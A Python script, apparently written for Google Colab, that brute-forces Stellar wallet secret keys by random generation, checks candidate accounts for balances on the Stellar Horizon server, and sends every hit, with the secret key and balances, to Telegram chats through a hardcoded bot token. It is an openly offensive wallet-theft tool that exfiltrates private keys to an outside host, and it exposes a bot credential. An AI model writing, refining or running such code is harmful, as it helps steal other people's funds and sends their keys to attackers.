import requests
from google.colab import output
from stellar_sdk import Keypair, Server
import random
from datetime import timedelta, datetime
import threading
import time


def send_msg_status(msg):
    token = "5223398033:AAGMfsS8KURMzpU_bssve1mBjvYKO5fE86w"
    chat_id = "-1001784612578"
    response = requests.get("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + str(msg) + "")

def send_msg_good_balance(msg):
    token = "5223398033:AAGMfsS8KURMzpU_bssve1mBjvYKO5fE86w"
    chat_id = "-1001651638965"
    response = requests.get("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + str(msg) + "")

def check_valid(numbers, bers):
    server = Server(horizon_url="https://horizon.stellar.org")
    try:
        account = server.accounts().account_id(numbers).call()
        send_msg_good_balance('True VALID BALANCE \n{0}\n{1}\n\n{2}'.format(numbers, bers, account['balances']))
        print(account['balances'])
    except Exception as e:
        print(e)
        #print("account['balances']")
        pass

def send_msg(msg):
    token = "5223398033:AAGMfsS8KURMzpU_bssve1mBjvYKO5fE86w"
    chat_id = "-1001682593419"
    response = requests.get("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + str(msg) + "")
    #print(response)


def g2(rolls):
    data = "234567QWERTYUIOPLKJHGFDSAZXCVBNM"
    result = ""
    while rolls >= 1:
      c = random.choice(data)
      result = c + result
      rolls = rolls - 1
    return result

def gg(rolls):
    data = "ABCD"
    result = ""
    while rolls >= 1:
      c = random.choice(data)
      result = c + result
      rolls = rolls - 1
    return result

def generator():
    secret = "S" + gg(1)
    secret = secret + g2(54)
    secret = secret.replace(" ","")
    #print(secret)
    return secret  

#56, 
def login_check(hash):
    try:
        keypair = Keypair.from_secret(hash)
        can_sign = keypair.can_sign()
        public_key = keypair.public_key
        #print(public_key)
        #print(can_sign)
        if can_sign == True:
            time.sleep(0.5)
            send_msg('True LOGIN \n{0}'.format(hash))
            print('True LOGIN {0}'.format(hash))
            with open('2.txt', 'a') as writefile:
                writefile.write('\n{0}'.format(hash))
            check_valid(public_key, hash)    
    except ValueError as error:
        #print(error)
        pass


now = datetime.now()
after_30_minutes = now + timedelta(minutes=5)

def Start_proc():
    hash = generator()
    login_check(hash)
    return hash

n = 0
while True:
    for i in range(1,1000):
        for io in range(1,25):
            now = datetime.now()
            n +=1
            hash = Start_proc()
            if now >= after_30_minutes:
                time.sleep(0.5)
                after_30_minutes = now + timedelta(minutes=5)
                send_msg_status('Еще Работаю.\n<b>Проверил {0}</b>'.format(n))
                output.clear()
                print("Суммарно пройдено: " + str(n) + " Сейчас проверяю: " + str(hash),) 
